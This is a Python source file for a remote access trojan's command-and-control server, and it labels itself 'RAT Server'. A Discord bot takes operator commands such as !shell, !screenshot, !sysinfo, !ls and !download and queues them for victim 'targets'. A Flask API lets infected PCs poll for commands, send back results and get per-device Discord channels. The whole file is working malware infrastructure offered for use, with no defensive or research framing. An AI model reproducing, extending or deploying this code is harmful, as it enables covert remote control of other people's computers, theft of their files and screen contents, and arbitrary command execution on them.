import discord
import os
from flask import Flask, request
import threading
import asyncio
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Flask app
app = Flask(__name__)

# ENV variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_KEY = os.getenv("API_KEY")
GUILD_ID = int(os.getenv("GUILD_ID", 1485050302603202694))
DEVICE_CATEGORY_ID = int(os.getenv("DEVICE_CATEGORY_ID", 1485050303375081584))

# Storage
pending_commands = []
connected_devices = {}
device_channels = {}  # pc_name -> channel_id

# Discord bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
client = discord.Client(intents=intents)

# Global event loop reference
discord_loop = None

@client.event
async def on_ready():
    global discord_loop
    discord_loop = asyncio.get_event_loop()
    print(f'[+] Discord Bot ONLINE!')
    print('[+] Logged in as:', client.user.name.encode('ascii', 'ignore').decode('ascii'))

    guild = client.get_guild(GUILD_ID)
    if not guild:
        print('[!] Guild not found')
        return

    category = guild.get_channel(DEVICE_CATEGORY_ID)
    if not category:
        print('[!] Category not found')
        return

    try:
        channel = await guild.create_text_channel(
            name='bot-online',
            category=category
        )
        await channel.send('✅ Bot is ONLINE! Send !help for commands')
        print('[+] Test channel created!')
    except Exception as e:
        print(f'[!] Channel error: {e}')

@client.event
async def on_message(message):
    if message.author.bot:
        return

    if not message.guild or message.guild.id != GUILD_ID:
        return

    content = message.content
    
    if content.startswith('!'):
        cmd = content[1:].strip().lower()
        
        if cmd == 'ping':
            await message.channel.send('🏓 Pong! Bot is working!')
        
        elif cmd == 'status':
            await message.channel.send(f'✅ Bot online! Connected devices: {len(connected_devices)}')
        
        elif cmd == 'help':
            help_text = r"""**📋 ALL COMMANDS:**

**Bot Control:**
• `!ping` - Test if bot is working
• `!status` - Show connected devices count
• `!help` - Show this help menu

**Device Control (all targets):**
• `!message <text>` - Send popup message
• `!shell <command>` - Execute shell command
• `!screenshot` - Capture screen
• `!sysinfo` - Get system information
• `!ls <path>` - List directory
• `!download <file>` - Download file

**Device Control (specific device):**
Use commands in device-specific channels to control individual PCs.

**Examples:**
• `!message Hello World`
• `!shell whoami`
• `!screenshot`
• `!ls C:\Users`"""
            await message.channel.send(help_text)
        
        elif cmd in ['message', 'shell', 'screenshot', 'sysinfo'] or cmd.startswith(('message ', 'shell ')):
            pending_commands.append(content[1:])
            await message.channel.send(f'📤 Sent to all targets: `{content[1:]}`')

# Async function to create device channel (runs in Discord's event loop)
async def create_device_channel(pc_name):
    """Create a channel for a new device"""
    try:
        guild = client.get_guild(GUILD_ID)
        if not guild:
            print(f'[!] Guild not found for device {pc_name}')
            return
        
        category = guild.get_channel(DEVICE_CATEGORY_ID)
        if not category:
            print(f'[!] Category not found for device {pc_name}')
            return
        
        # Sanitize channel name (lowercase, no spaces, alphanumeric only)
        raw_name = pc_name.lower().strip()
        channel_name = ''.join(c for c in raw_name if c.isalnum() or c == '-' or c == '_')[:50]
        
        # Fallback if empty or invalid
        if not channel_name or channel_name == 'unknown':
            channel_name = f'device-{len(device_channels) + 1}'
        
        print(f'[*] Creating channel: {channel_name} (from {pc_name})')
        
        # Check if channel already exists
        for channel in category.channels:
            if channel.name == channel_name:
                print(f'[*] Channel {channel_name} already exists')
                device_channels[pc_name] = channel.id
                return
        
        # Create new channel
        channel = await guild.create_text_channel(
            name=channel_name,
            category=category,
            topic=f'Device: {pc_name}'
        )
        
        device_channels[pc_name] = channel.id
        
        # Send welcome message
        await channel.send(f'🎉 **Device Connected!**\n**Name:** {pc_name}\n**Status:** Online\n\nUse `!message`, `!shell`, `!screenshot`, `!sysinfo` here to control this device.')
        
        print(f'[+] Created channel {channel_name} for {pc_name}')
        
    except Exception as e:
        print(f'[!] Error creating channel for {pc_name}: {e}')

# Function to trigger from Flask (thread-safe)
def trigger_device_channel(pc_name):
    """Called from Flask thread to create a device channel"""
    global discord_loop
    
    # Debug: Check if loop is ready
    if discord_loop is None:
        print(f'[!] Discord loop not ready yet for {pc_name}')
        return
    
    if pc_name in device_channels:
        print(f'[*] Channel already exists for {pc_name}')
        return
    
    # Fire and forget - don't block Flask
    try:
        asyncio.run_coroutine_threadsafe(create_device_channel(pc_name), discord_loop)
        print(f'[*] Scheduled channel creation for {pc_name}')
    except Exception as e:
        print(f'[!] Failed to schedule channel: {e}')

# Flask API Routes
@app.route('/')
def home():
    return f"RAT Server | Devices: {len(connected_devices)} | Commands: {len(pending_commands)}"

@app.route('/api/check')
def check():
    token = request.args.get('token')
    guild = request.args.get('guild')
    pc_name = request.args.get('pc', 'Unknown')
    
    # Validate API key (NOT the Discord token)
    if token != API_KEY:
        return 'Unauthorized', 401
    
    if guild != str(GUILD_ID):
        return 'Unauthorized', 401
    
    # Track device and trigger Discord channel creation
    if pc_name not in connected_devices:
        connected_devices[pc_name] = True
        print(f'[+] New device connected: {pc_name}')
        # Trigger Discord channel creation (thread-safe)
        trigger_device_channel(pc_name)
    
    # Return command if available
    if pending_commands:
        cmd = pending_commands.pop(0)
        return f'command:{cmd}'
    
    return 'No command'

@app.route('/api/result')
def result():
    token = request.args.get('token')
    guild = request.args.get('guild')
    pc_name = request.args.get('pc', 'Unknown')
    data = request.args.get('data', '')
    
    if token != API_KEY or guild != str(GUILD_ID):
        return 'Unauthorized', 401
    
    print(f'[+] Result from {pc_name}: {data}')
    return 'Result received'

# Start everything
def run_flask():
    port = int(os.environ.get('PORT', 5000))
    print(f'[+] Flask server on port {port}')
    app.run(host='0.0.0.0', port=port)

def main():
    print('[+] Starting RAT system...')
    
    # Start Flask in background
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Start Discord bot (main thread)
    print('[+] Starting Discord bot...')
    try:
        client.run(BOT_TOKEN)
    except Exception as e:
        print(f'[!] Bot error: {e}')

if __name__ == '__main__':
    main()
